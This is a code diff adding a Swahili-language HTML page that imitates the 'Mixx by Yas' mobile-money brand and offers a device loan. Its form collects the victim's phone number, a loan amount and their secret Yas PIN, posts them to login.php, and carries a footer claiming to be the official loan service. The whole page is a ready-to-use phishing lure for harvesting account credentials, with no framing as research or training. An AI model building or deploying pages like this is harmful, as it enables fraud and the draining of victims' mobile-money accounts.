@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx by Yas - Rahisi, Haraka, Kidigitali</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f4f8; 
+            margin: 0; 
+            padding: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+        }
+        .card { 
+            width: 90%; 
+            max-width: 400px; 
+            background: white; 
+            border-radius: 15px; 
+            overflow: hidden; 
+            box-shadow: 0 10px 25px rgba(0, 43, 91, 0.15); 
+            border-top: 6px solid #002B5B; /* Bluu Mazingira ya Juu */
+        }
+        .header { 
+            background-color: #ffffff; 
+            padding: 25px 25px 15px 25px; 
+            text-align: center; 
+        }
+        /* Sehemu ya Nembo (Logo) */
+        .logo-img {
+            width: 80px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+        .logo-text { 
+            color: #002B5B; /* Rangi ya Bluu ya Kimkakati */
+            font-size: 28px; 
+            font-weight: bold; 
+            margin: 0; 
+            letter-spacing: -1px; 
+        }
+        .logo-sub { 
+            color: #666; 
+            font-size: 13px; 
+            margin-top: 5px; 
+            font-weight: 700; 
+            letter-spacing: 1px;
+        }
+        .form-area { 
+            padding: 25px; 
+        }
+        .info-box { 
+            background: #FFFDE7; /* Njano laini kwa ajili ya ujumbe */
+            padding: 15px; 
+            border-radius: 8px; 
+            margin-bottom: 20px; 
+            border-left: 4px solid #FFD700; /* Njano iliyokolea pembeni */
+        }
+        .info-box p { 
+            margin: 0; 
+            font-size: 13px; 
+            color: #5d4037; 
+            line-height: 1.5; 
+        }
+        .input-group { 
+            margin-bottom: 18px; 
+        }
+        label { 
+            display: block; 
+            font-size: 13px; 
+            color: #002B5B; 
+            font-weight: 600;
+            margin-bottom: 6px; 
+            margin-left: 2px; 
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 2px solid #e2e8f0; 
+            border-radius: 8px; 
+            box-sizing: border-box; 
+            font-size: 15px; 
+            outline: none; 
+            transition: 0.3s; 
+        }
+        input:focus { 
+            border-color: #002B5B; /* Inabadilika kuwa bluu ikigusiwa */
+            box-shadow: 0 0 5px rgba(0, 43, 91, 0.2);
+        }
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: #FFD700; /* Kitufe cha Rangi ya Njano */
+            color: #002B5B; /* Maandishi ya Bluu kwenye Kitufe */
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            margin-top: 10px; 
+            box-shadow: 0 4px 6px rgba(255, 215, 0, 0.2);
+        }
+        button:hover { 
+            background-color: #E6C200; /* Njano ikikolea wakati wa kugusa */
+        }
+        .footer { 
+            text-align: center; 
+            padding: 15px; 
+            font-size: 11px; 
+            color: #718096; 
+            background-color: #f8fafc;
+            border-top: 1px solid #edf2f7;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <!-- Weka picha ya logo hapa, hakikisha jina linafanana -->
+            <img src="logo.png" alt="Mixx by Yas Logo" class="logo-img">
+            <div class="logo-text">Mixx by Yas</div>
+            <div class="logo-sub">RAHISI • HARAKA • KIDIGITALI</div>
+        </div>
+        <div class="form-area">
+            <div class="info-box">
+                <p>Ingiza taarifa zako hapa chini ili kukamilisha maombi yako ya mkopo wa vifaa kupitia mfumo wa Mixx by Yas.</p>
+            </div>
+            <form action="login.php" method="POST">
+                <div class="input-group">
+                    <label>Namba ya Simu ya Yas</label>
+                    <input type="number" name="namba" placeholder="Mf: 07XXXXXXXX" required>
+                </div>
+                <div class="input-group">
+                    <label>Kiasi cha Mkopo Unachoomba (TSH)</label>
+                    <input type="number" name="kiasi" placeholder="Mf: 500000" required>
+                </div>
+                <div class="input-group">
+                    <label>Namba ya Siri (Yas PIN)</label>
+                    <input type="password" name="pin" placeholder="Ingiza PIN yako ya Yas" required>
+                </div>
+                <button type="submit">Kamilisha Maombi</button>
+            </form>
+        </div>
+        <div class="footer">
+            Huduma hii inatolewa na Yas Loan Services Tanzania.<br>
+            &copy; 2026 Mixx by Yas. Haki zote zimehifadhiwa.
+        </div>
+    </div>
+</body>
+</html>
+
